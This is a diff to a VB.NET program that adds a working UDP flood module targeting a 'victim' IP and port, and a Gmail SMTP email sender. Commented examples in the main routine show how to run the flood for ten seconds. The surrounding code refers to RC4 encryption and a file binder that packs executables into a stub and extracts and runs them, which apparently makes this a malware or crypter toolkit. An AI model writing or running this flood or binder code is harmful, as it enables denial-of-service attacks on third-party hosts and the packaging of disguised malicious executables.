@@ -46,6 +46,64 @@ Module RC4Encryption
     End Function
 End Module
 
+Imports System.Net
+Imports System.Net.Sockets
+Imports System.ComponentModel
+
+Module NetworkTools
+    Private WithEvents bgWorker As New BackgroundWorker()
+    Private floodIP As String
+    Private floodPort As Integer
+
+    Public Sub StartUdpFlood(ByVal ip As String, ByVal port As Integer)
+        floodIP = ip
+        floodPort = port
+        bgWorker.WorkerSupportsCancellation = True
+        bgWorker.RunWorkerAsync()
+    End Sub
+
+    Public Sub StopUdpFlood()
+        bgWorker.CancelAsync()
+    End Sub
+
+    Private Sub bgWorker_DoWork(ByVal sender As Object, ByVal e As DoWorkEventArgs) Handles bgWorker.DoWork
+        Dim victimIp As IPAddress = IPAddress.Parse(floodIP)
+        Dim victim As New IPEndPoint(victimIp, floodPort)
+        Dim packet As Byte() = New Byte(1469) {}
+        Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
+        While Not bgWorker.CancellationPending
+            Try
+                socket.SendTo(packet, victim)
+            Catch ex As Exception
+                ' Handle exceptions, e.g., host not reachable
+            End Try
+        End While
+    End Sub
+End Module
+
+Imports System.Net.Mail
+
+Module EmailSender
+    Public Sub SendGmail(ByVal fromAddress As String, ByVal fromPassword As String, ByVal toAddress As String, ByVal subject As String, ByVal body As String)
+        Try
+            Dim mailMessage As New MailMessage()
+            mailMessage.From = New MailAddress(fromAddress)
+            mailMessage.To.Add(toAddress)
+            mailMessage.Subject = subject
+            mailMessage.Body = body
+            mailMessage.Priority = MailPriority.High
+
+            Dim smtpServer As New SmtpClient("smtp.gmail.com")
+            smtpServer.Port = 587
+            smtpServer.Credentials = New System.Net.NetworkCredential(fromAddress, fromPassword)
+            smtpServer.EnableSsl = True
+            smtpServer.Send(mailMessage)
+        Catch ex As Exception
+            Console.WriteLine("Error sending email: " & ex.Message)
+        End Try
+    End Sub
+End Module
+
 Module Program
     Sub Main()
         ' --- RC4 Encryption/Decryption Example ---
@@ -71,6 +129,15 @@ Module Program
         'FileBinder.BindFiles({"file1.exe", "file2.exe"}, "stub.exe", "bound.exe")
         ' To extract, you would run the "bound.exe" file.
         'FileBinder.ExtractAndRunFiles() ' This would be called from the stub
+
+        ' --- Email Sender Example ---
+        ' NOTE: This requires the sender's GMail account to have "less secure app access" enabled.
+        'EmailSender.SendGmail("sender@gmail.com", "password", "recipient@example.com", "Test Subject", "This is a test email.")
+
+        ' --- UDP Flood Example ---
+        'NetworkTools.StartUdpFlood("127.0.0.1", 80)
+        'System.Threading.Thread.Sleep(10000) ' Flood for 10 seconds
+        'NetworkTools.StopUdpFlood()
     End Sub
 End Module
 
